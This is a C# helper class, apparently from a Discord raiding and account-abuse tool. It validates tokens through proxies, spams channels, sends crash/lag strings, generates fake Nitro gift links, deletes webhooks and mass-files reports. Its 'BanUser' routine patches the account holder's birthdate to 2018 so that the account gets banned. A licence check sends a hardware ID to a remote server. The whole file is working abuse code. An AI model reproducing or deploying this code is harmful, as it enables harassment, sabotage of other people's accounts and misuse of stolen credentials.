using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Net;
using Xenya.Properties;
public partial class Utils
{
    public static Random rand = new Random();
    public static List<string> UsedStrings = new List<string>();
    public static string crashString1 = Encoding.Unicode.GetString(Resources._1);
    public static string crashString2 = Encoding.Unicode.GetString(Resources._2);
    public static string crashString3 = Encoding.Unicode.GetString(Resources._3);
    public static string crashString4 = Encoding.Unicode.GetString(Resources._4);
    public static string crashString5 = Encoding.Unicode.GetString(Resources._5);
    public static string crashString6 = Encoding.Unicode.GetString(Resources._6);
    public static string crashString7 = Encoding.Unicode.GetString(Resources._7);
    public static string GetInviteCodeByInviteLink(string inviteLink)
    {
        try
        {
            if (inviteLink.EndsWith("/"))
            {
                inviteLink = inviteLink.Substring(0, inviteLink.Length - 1);
            }
            if (inviteLink.Contains("discord") && inviteLink.Contains("/") && inviteLink.Contains("http"))
            {
                string[] splitter = Microsoft.VisualBasic.Strings.Split(inviteLink, "/");
                return splitter[splitter.Length - 1];
            }
        }
        catch (Exception ex)
        {
        }
        return inviteLink;
    }
    public static string RandomChineseString(int length)
    {
        string Chr = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙";
        var sb = new StringBuilder();
        for (int i = 1, loopTo = length; i <= loopTo; i++)
        {
            int idx = rand.Next(0, Chr.Length);
            sb.Append(Chr.Substring(idx, 1));
        }
        if (UsedStrings.Contains(sb.ToString()))
        {
            while (UsedStrings.Contains(sb.ToString()))
            {
                sb.Clear();
                for (int i = 1, loopTo1 = length; i <= loopTo1; i++)
                {
                    int idx = rand.Next(0, Chr.Length);
                    sb.Append(Chr.Substring(idx, 1));
                }
            }
        }
        UsedStrings.Add(sb.ToString());
        return sb.ToString();
    }
    public static string RandomNormalString(int length)
    {
        string Chr = "abcedfghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        var sb = new StringBuilder();
        for (int i = 1, loopTo = length; i <= loopTo; i++)
        {
            int idx = rand.Next(0, Chr.Length);
            sb.Append(Chr.Substring(idx, 1));
        }
        if (UsedStrings.Contains(sb.ToString()))
        {
            while (UsedStrings.Contains(sb.ToString()))
            {
                sb.Clear();
                for (int i = 1, loopTo1 = length; i <= loopTo1; i++)
                {
                    int idx = rand.Next(0, Chr.Length);
                    sb.Append(Chr.Substring(idx, 1));
                }
            }
        }
        UsedStrings.Add(sb.ToString());
        return sb.ToString();
    }
    public static string RandomCapitalString(int Caps)
    {
        var sb = new StringBuilder();
        for (int i = 1, loopTo = Caps; i <= loopTo; i++)
        {
            int idx = rand.Next(100, 900);
            sb.Append(@"\u" + idx.ToString());
        }
        sb.Append(@"\");
        if (UsedStrings.Contains(sb.ToString()))
        {
            while (UsedStrings.Contains(sb.ToString()))
            {
                sb.Clear();
                for (int i = 1, loopTo1 = Caps; i <= loopTo1; i++)
                {
                    int idx = rand.Next(100, 900);
                    sb.Append(@"\u" + idx.ToString());
                }
                sb.Append(@"\");
            }
        }
        UsedStrings.Add(sb.ToString());
        return sb.ToString();
    }
    public static string GetLagString()
    {
        int theNum = GetRandomNumber(0, 8);
        if (theNum <= 1)
        {
            return crashString1.Substring(0, crashString1.Length - 950);
        }
        else if (theNum == 2)
        {
            return crashString2.Substring(0, crashString2.Length - 950);
        }
        else if (theNum == 3)
        {
            return crashString3.Substring(0, crashString3.Length - 950);
        }
        else if (theNum == 4)
        {
            return crashString4.Substring(0, crashString4.Length - 950);
        }
        else if (theNum == 5)
        {
            return crashString5.Substring(0, crashString5.Length - 950);
        }
        else if (theNum == 6)
        {
            return crashString6.Substring(0, crashString6.Length - 950);
        }
        else if (theNum >= 7)
        {
            return crashString7.Substring(0, crashString7.Length - 950);
        }
        return "";
    }
    public static int GetRandomNumber(int cap)
    {
        return rand.Next(0, cap);
    }
    public static int GetRandomNumber(int min, int cap)
    {
        return rand.Next(min, cap);
    }
    public static string GetRandomNitroCode()
    {
        return GetAlphanumericalString(16);
    }
    public static string GetRandomNitroLink()
    {
        return "https://discordapp.com/gifts/" + GetRandomNitroCode();
    }
    public static string GetRandomToken()
    {
        return "NzI" + GetAlphanumericalString(21) + ".X" + GetAlphanumericalString(5) + "." + GetAlphanumericalString(2) + "_" + GetAlphanumericalString(24);
    }
    public static string GetAlphanumericalString(int length)
    {
        string Chr = "abcedfghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var sb = new StringBuilder();
        for (int i = 1, loopTo = length; i <= loopTo; i++)
        {
            int idx = rand.Next(0, Chr.Length);
            sb.Append(Chr.Substring(idx, 1));
        }
        if (UsedStrings.Contains(sb.ToString()))
        {
            while (UsedStrings.Contains(sb.ToString()))
            {
                sb.Clear();
                for (int i = 1, loopTo1 = length; i <= loopTo1; i++)
                {
                    int idx = rand.Next(0, Chr.Length);
                    sb.Append(Chr.Substring(idx, 1));
                }
            }
        }
        UsedStrings.Add(sb.ToString());
        return sb.ToString();
    }
    public static bool IsTokenValid(string Token, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v7/users/@me");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    Req.Proxy = new WebProxy(ProxyIp, Convert.ToInt32(ProxyPort));
                }
            }
            Req.Method = "GET";
            Req.UserAgent = UserAgent;
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            return new StreamReader(((HttpWebResponse)Req.GetResponse()).GetResponseStream()).ReadToEnd().Contains("id");
        }
        catch (Exception ex)
        {
            return false;
        }
    }
    public static bool IsTokenVerified(string Token, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v6/users/@me/library");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    Req.Proxy = new WebProxy(ProxyIp, Convert.ToInt32(ProxyPort));
                }
            }
            Req.Method = "GET";
            Req.UserAgent = UserAgent;
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            new StreamReader(((HttpWebResponse)Req.GetResponse()).GetResponseStream()).ReadToEnd().ToString();
            return true;
        }
        catch (Exception ex)
        {
            return false;
        }
    }
    public static string RemoveEmailVerification(string Token, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v6/guilds/0/members");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    Req.Proxy = new WebProxy(ProxyIp, Convert.ToInt32(ProxyPort));
                }
            }
            Req.Method = "GET";
            Req.UserAgent = UserAgent;
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            return new StreamReader(((HttpWebResponse)Req.GetResponse()).GetResponseStream()).ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }
    public static string DeleteWebHook(string WebhookUrl, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create(WebhookUrl);
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    Req.Proxy = new WebProxy(ProxyIp, Convert.ToInt32(ProxyPort));
                }
            }
            Req.Method = "DELETE";
            Req.UserAgent = UserAgent;
            return new StreamReader(((HttpWebResponse)Req.GetResponse()).GetResponseStream()).ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }
    public static bool CheckWebhook(string WebhookUrl, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create(WebhookUrl);
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    Req.Proxy = new WebProxy(ProxyIp, Convert.ToInt32(ProxyPort));
                }
            }
            Req.Method = "GET";
            Req.UserAgent = UserAgent;
            var coso = new StreamReader(((HttpWebResponse)Req.GetResponse()).GetResponseStream()).ReadToEnd();
            return true;
        }
        catch (Exception ex)
        {
            return false;
        }
    }
    public static string GetChannelIDByFriendID(string Token, string FriendID, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v6/users/@me/channels");
            var Data = Encoding.ASCII.GetBytes("{" + $"\"recipient_id\": \"{FriendID}\"" + "}");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    int Proxyp = Convert.ToInt32(ProxyPort);
                    Req.Proxy = new WebProxy(ProxyIp, Proxyp);
                }
            }
            Req.Method = "POST";
            Req.UserAgent = UserAgent;
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            Req.ContentLength = Data.Length;
            using (var stream = Req.GetRequestStream()) { stream.Write(Data, 0, Data.Length); }
            var Response = (HttpWebResponse)Req.GetResponse();
            var ResponseInString = new StreamReader(Response.GetResponseStream()).ReadToEnd();
            string[] splitter = Microsoft.VisualBasic.Strings.Split(ResponseInString, ",");
            ResponseInString = splitter[0].Replace('"'.ToString(), "").Replace("{", "").Replace("}", "").Replace("id:", "").Replace(" ", "");
            return ResponseInString;
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
    public static string SendMessageToChannel(string Token, string ChannelID, string Content, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            var Req = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v6/channels/{ChannelID}/messages");
            var Data = Encoding.ASCII.GetBytes("{" + $"\"content\": \"{Content}\"" + "}");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    int Proxyp = Convert.ToInt32(ProxyPort);
                    Req.Proxy = new WebProxy(ProxyIp, Proxyp);
                }
            }
            Req.Method = "POST";
            Req.UserAgent = UserAgent;
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            Req.ContentLength = Data.Length;
            using (var stream = Req.GetRequestStream()) { stream.Write(Data, 0, Data.Length); }
            var Response = (HttpWebResponse)Req.GetResponse();
            var ResponseInString = new StreamReader(Response.GetResponseStream()).ReadToEnd();
            return ResponseInString;
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
    public static bool SendReport(string Token, string channelId, string messageId, string guildId, string reason, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            HttpWebRequest Req = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v8/report");
            var Data = Encoding.ASCII.GetBytes("{" + $"\"channel_id\":\"{channelId}\",\"message_id\":{messageId},\"guild_id\":\"{guildId}\",\"reason\":\"{reason}\"" + "}");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    int Proxyp = Convert.ToInt32(ProxyPort);
                    Req.Proxy = new WebProxy(ProxyIp, Proxyp);
                }
            }
            Req.Method = "POST";
            Req.UserAgent = "Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0";
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            Req.Headers.Add("Accept-Encoding", "gzip, deflate");
            Req.Headers.Add("Accept-Language", "sv-SE");
            Req.ContentLength = Data.Length;
            using (var stream = Req.GetRequestStream()) { stream.Write(Data, 0, Data.Length); }
            var Response = (HttpWebResponse)Req.GetResponse();
            return new StreamReader(Response.GetResponseStream()).ReadToEnd().Contains("id:");
        }
        catch (Exception ex)
        {
            return false;
        }
    }
    public static string Base64Encode(string plainText)
    {
        var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
        return System.Convert.ToBase64String(plainTextBytes);
    }
    public static void BanNow(string hardware)
    {
        try
        {
            System.Net.WebClient webClient = new System.Net.WebClient();
            webClient.DownloadString("https://mathplusplus.altervista.org/weruweruyweiuyriyweiuryiuweyriuyweiurywieuyriuwyeriuyweiurywiueyriuweyriurwey/weruewuryiuweryiuweyriuyweriuyweuiryiuweyriuyweriuyweiurywieuryiuwre/uerjhwejrhjkwehrkjwherkjhwekjrhwkjehrkjhwekjrhwekjrh.php?kkwjklqjlkjeqlkjelkqjeqlwkjelqkwjelkqewlkjelkqje=" + hardware);
        }
        catch (Exception ex)
        {
        }
        System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\a.a");
        System.Diagnostics.Process.GetCurrentProcess().Kill();
    }
    public static bool isBanned(string hardware)
    {
        try
        {
            System.Net.WebClient webClient = new System.Net.WebClient();
            return webClient.DownloadString("https://mathplusplus.altervista.org/weruweruyweiuyriyweiuryiuweyriuyweiurywieuyriuwyeriuyweiurywiueyriuweyriurwey/weruewuryiuweryiuweyriuyweriuyweuiryiuweyriuyweriuyweiurywieuryiuwre/irejewjrhwejrhjwkehrkjwherkjhewrkjhewkjrhwkjehrjkwehrjkehrjkhwekjrhwjekrh.php?yweruhwekrjhwkejhrkjewhrkjhwekjrhwekjhrkjwehrkjwhr=" + hardware).Contains("y") || System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\a.a");
        }
        catch (Exception ex)
        {
        }
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\a.a"))
        {
            try
            {
                System.Net.WebClient webClient = new System.Net.WebClient();
                webClient.DownloadString("https://mathplusplus.altervista.org/weruweruyweiuyriyweiuryiuweyriuyweiurywieuyriuwyeriuyweiurywiueyriuweyriurwey/weruewuryiuweryiuweyriuyweriuyweuiryiuweyriuyweriuyweiurywieuryiuwre/uerjhwejrhjkwehrkjwherkjhwekjrhwkjehrkjhwekjrhwekjrh.php?kkwjklqjlkjeqlkjelkqjeqlwkjelqkwjelkqewlkjelkqje=" + hardware);
            }
            catch (Exception ex)
            {
            }
            return true;
        }
        return false;
    }
    public static string BanUser(string Token, string ProxyIp = "", string ProxyPort = "", string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    {
        try
        {
            string birthDate = "2018-7-16";
            var Req = (HttpWebRequest)WebRequest.Create($"https://discord.com/api/v6/users/@me");
            var Data = Encoding.ASCII.GetBytes("{" + $"\"date_of_birth\": \"{birthDate}\"" + "}");
            if (ProxyIp != "")
            {
                if (ProxyPort != "")
                {
                    int Proxyp = Convert.ToInt32(ProxyPort);
                    Req.Proxy = new WebProxy(ProxyIp, Proxyp);
                }
            }
            Req.Method = "PATCH";
            Req.UserAgent = UserAgent;
            Req.ContentType = "application/json";
            Req.Headers.Add("authorization", Token);
            Req.ContentLength = Data.Length;
            using (var stream = Req.GetRequestStream()) { stream.Write(Data, 0, Data.Length); }
            var Response = (HttpWebResponse)Req.GetResponse();
            var ResponseInString = new StreamReader(Response.GetResponseStream()).ReadToEnd();
            return ResponseInString;
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
    public static string AES_Encrypt(string input, string pass)
    {
        var AES = new System.Security.Cryptography.RijndaelManaged();
        var Hash_AES = new System.Security.Cryptography.MD5CryptoServiceProvider();
        string encrypted = "";
        try
        {
            var hash = new byte[32];
            var temp = Hash_AES.ComputeHash(Encoding.ASCII.GetBytes(pass));
            Array.Copy(temp, 0, hash, 0, 16);
            Array.Copy(temp, 0, hash, 15, 16);
            AES.Key = hash;
            AES.Mode = System.Security.Cryptography.CipherMode.ECB;
            var DESEncrypter = AES.CreateEncryptor();
            var Buffer = Encoding.ASCII.GetBytes(input);
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length));
            return encrypted;
        }
        catch (Exception ex)
        {
        }
        return default;
    }
    public static string AES_Decrypt(string input, string pass)
    {
        var AES = new System.Security.Cryptography.RijndaelManaged();
        var Hash_AES = new System.Security.Cryptography.MD5CryptoServiceProvider();
        string decrypted = "";
        try
        {
            var hash = new byte[32];
            var temp = Hash_AES.ComputeHash(Encoding.ASCII.GetBytes(pass));
            Array.Copy(temp, 0, hash, 0, 16);
            Array.Copy(temp, 0, hash, 15, 16);
            AES.Key = hash;
            AES.Mode = System.Security.Cryptography.CipherMode.ECB;
            var DESDecrypter = AES.CreateDecryptor();
            var Buffer = Convert.FromBase64String(input);
            decrypted = Encoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length));
            return decrypted;
        }
        catch (Exception ex)
        {
        }
        return default;
    }
}